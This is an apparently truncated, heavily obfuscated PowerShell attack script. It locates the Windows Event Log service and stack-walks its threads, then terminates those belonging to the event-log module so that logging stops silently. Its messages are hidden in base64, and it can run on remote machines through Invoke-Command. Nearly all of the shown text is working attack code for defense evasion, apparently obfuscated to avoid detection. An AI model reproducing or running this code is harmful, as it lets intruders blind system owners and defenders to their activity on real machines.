                if (!${_/\_/\/=\/\_/==\/}::GetThreadContext(${__/\/\/=\/====\/\}, ${_/\__/\__/=\__/\/})) { Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AZgAgAGcAZQB0ACAAYwBvAG4AdABlAHgAdAAgAG8AZgAgAHQAaAByAGUAYQBkACAAJAB7AF8AXwAvAD0APQBcAF8ALwA9AFwALwA9AFwAXwBfAF8ALwA9AH0ALgA='))) }
                ${___/\/=====\___/=} = [Runtime.InteropServices.Marshal]::PtrToStructure(${_/\__/\__/=\__/\/}, [Type]${/==\/===\_/\/===\})
                ${/==\_____/\_/\_/\} = __/\/\__/==\/=\___ ${___/\/=====\___/=}.StIIP ${___/\/=====\___/=}.IntSp ${___/\/=====\___/=}.RsBSP ${___/\/=====\___/=}.IntSp
            }
            ${/====\_/=\/===\/\} = $null
            ${_/==\/\_/=\/\_/\_} = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf(${/==\_____/\_/\_/\}))
            [Runtime.InteropServices.Marshal]::StructureToPtr(${/==\_____/\_/\_/\}, ${_/==\/\_/=\/\_/\_}, $false)
            do {
                if (!${/=\_/=\____/\_/\/}::StackWalk64(${/==\__/=\__/\/=\_}, ${____/===\/=\_/\/\_}, ${__/\/\/=\/====\/\}, ${_/==\/\_/=\/\_/\_}, ${_/\__/\__/=\__/\/}, $null, ${/===\/==\_/=\/\/=}, ${/==\/\____/\/\___}, $null)) {
                    Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHMAdABhAGMAawBmAHIAYQBtAGUAIABmAG8AcgAgAHQAaAByAGUAYQBkACAAJAB7AF8AXwAvAD0APQBcAF8ALwA9AFwALwA9AFwAXwBfAF8ALwA9AH0ALgA=')))
                }
                ${/==\_____/\_/\_/\} = [Runtime.InteropServices.Marshal]::PtrToStructure(${_/==\/\_/=\/\_/\_}, [Type]${_/=\/\/=\__/\/=\/})
                ${_/\_/\_/\/=\_/\/=} = New-Object Text.StringBuilder(256)
                [void]${/=====\/=\/====\/}::GetMappedFileNameW(${____/===\/=\_/\/\_}, [IntPtr](_/=====\____/=\_/\ ${/==\_____/\_/\_/\}.AddrPC.Offset), ${_/\_/\_/\/=\_/\/=}, ${_/\_/\_/\/=\_/\/=}.Capacity)
                ${_/=\_/=====\/\/\_} = __/\/=\_/==\___/== -____/===\/=\_/\/\_ ${____/===\/=\_/\/\_} -___/===\/=\____/\/ ${/==\_____/\_/\_/\}.AddrPC.Offset
                ${/=\/====\/\_____/} = (([String]${_/=\_/=====\/\/\_}.Name).Replace(' ','')).TrimEnd([Byte]0)
                ${___/===\/=\/==\__} = @{
                    ProcessId  = ${__/\______/\/\/=\/}
                    ThreadId   = ${__/==\_/=\/=\___/=}
                    AddrPC     = ${/==\_____/\_/\_/\}.AddrPC.Offset
                    AddrReturn = ${/==\_____/\_/\_/\}.AddrReturn.Offset
                    Symbol     = ${/=\/====\/\_____/}
                    MappedFile = ${_/\_/\_/\/=\_/\/=}
                }
                New-Object -TypeName PSObject -Property ${___/===\/=\/==\__}
            } until (${/==\_____/\_/\_/\}.AddrReturn.Offset -eq 0) 
            [Runtime.InteropServices.Marshal]::FreeHGlobal(${_/==\/\_/=\/\_/\_})
            [Runtime.InteropServices.Marshal]::FreeHGlobal(${_/\__/\__/=\__/\/})
            if (${_/\_/\/=\/\_/==\/}::ResumeThread(${__/\/\/=\/====\/\}) -eq -1) { Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwB1AG0AZQAgAHQAaAByAGUAYQBkACAAJAB7AF8AXwAvAD0APQBcAF8ALwA9AFwALwA9AFwAXwBfAF8ALwA9AH0ALgA='))) }
            if (!${_/\_/\/=\/\_/==\/}::CloseHandle.Invoke(${__/\/\/=\/====\/\})) { Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGwAbwBzAGUAIABoAGEAbgBkAGwAZQAgAGYAbwByACAAdABoAHIAZQBhAGQAIAAkAHsAXwBfAC8APQA9AFwAXwAvAD0AXAAvAD0AXABfAF8AXwAvAD0AfQAuAA=='))) }
        }
        Write-Host "[*] Enumerating threads of PID: $(gwmi -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)..." -ForegroundColor Yellow
        foreach (${__/\_____/===\/=\} in (ps -Id (gwmi -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)))
            {
                if ((${____/===\/=\_/\/\_} = ${_/\_/\/=\/\_/==\/}::OpenProcess(0x1F0FFF, $false, ${__/\_____/===\/=\}.Id)) -eq 0) {
                    Write-Error -Message "Unable to open handle for process $(${__/\_____/===\/=\}.Id)... Moving on."
                    continue
                }
                if (!${/=\_/=\____/\_/\/}::SymInitialize(${____/===\/=\_/\/\_}, $null, $false)) {
                    Write-Error "Unable to initialize symbol handler for process $(${__/\_____/===\/=\}.Id).... Quitting."
                    if (!${_/\_/\/=\/\_/==\/}::CloseHandle.Invoke(${____/===\/=\_/\/\_})) { Write-Error "Unable to close handle for process $(${__/\_____/===\/=\}.Id)." }
                    break
                }
                ${__/\_____/===\/=\}.Threads | % -Process { _____/=\/\/=====\_ -____/===\/=\_/\/\_ ${____/===\/=\_/\/\_} -__/==\_/=\/=\___/= $_.Id -__/\______/\/\/=\/ ${__/\_____/===\/=\}.Id }
                if (!${/=\_/=\____/\_/\/}::SymCleanup(${____/===\/=\_/\/\_})) { Write-Error "Unable to cleanup symbol resources for process $(${__/\_____/===\/=\}.Id)." }
                if (!${_/\_/\/=\/\_/==\/}::CloseHandle.Invoke(${____/===\/=\_/\/\_})) { Write-Error "Unable to close handle for process $(${__/\_____/===\/=\}.Id)." }
                [GC]::Collect()
            }
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) { ${/=\/\/\_/\/\_/\_/} = icm -ComputerName $ComputerName -ScriptBlock $RemoteScriptBlock -ArgumentList @($Name, $Id) }
    else { ${/=\/\/\_/\/\_/\_/} = icm -ScriptBlock ${/=\/\/==\/\___/=\} -ArgumentList @($Name, $Id) }
    ${_/==\/==\_/\/===\} = ${/=\/\/\_/\/\_/\_/} | ? {$_.MappedFile -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBlAHYAdAAqAA==')))} | %{$_.ThreadId }
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAcgBzAGkAbgBnACAARQB2AGUAbgB0ACAATABvAGcAIABTAGUAcgB2AGkAYwBlACAAVABoAHIAZQBhAGQAcwAuAC4ALgA='))) -ForegroundColor Yellow
    if(!(${_/==\/==\_/\/===\})) {
      Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABUAGgAZQByAGUAIABhAHIAZQAgAG4AbwAgAEUAdgBlAG4AdAAgAEwAbwBnACAAUwBlAHIAdgBpAGMAZQAgAFQAaAByAGUAYQBkAHMALAAgAEUAdgBlAG4AdAAgAEwAbwBnACAAUwBlAHIAdgBpAGMAZQAgAGkAcwAgAG4AbwB0ACAAdwBvAHIAawBpAG4AZwAhAA=='))) -ForegroundColor Red
      Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABZAG8AdQAgAGEAcgBlACAAcgBlAGEAZAB5ACAAdABvACAAZwBvACEA'))) -ForegroundColor Green
      Write-Host ""
    }
    else {
        [array]${/==\/=========\__} = ${_/==\/==\_/\/===\}
        for (${_/\/=\___/===\_/\} = 0; ${_/\/=\___/===\_/\} -lt ${/==\/=========\__}.Count; ${_/\/=\___/===\_/\}++) {
            ${___/==\_/\__/=\_/} = ${_/\_/\/=\/\_/==\/}::OpenThread(0x0001, $false, $(${/==\/=========\__}[${_/\/=\___/===\_/\}]))
            if (${___/=====\__/\/=\} = ${_/\_/\/=\/\_/==\/}::TerminateThread(${___/==\_/\__/=\_/}, 1)) {Write-Host "[+] Thread $(${/==\/=========\__}[${_/\/=\___/===\_/\}]) Succesfully Killed!" -ForegroundColor Green}
            ${___/\/\/===\____/} = ${_/\_/\/=\/\_/==\/}::CloseHandle(${___/==\_/\__/=\_/})
        }
        Write-Host ""
        Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAGwAbAAgAGQAbwBuAGUALAAgAHkAbwB1ACAAYQByAGUAIAByAGUAYQBkAHkAIAB0AG8AIABnAG8AIQA='))) -ForegroundColor Green
        Write-Host ""
    }
    [GC]::Collect()
}
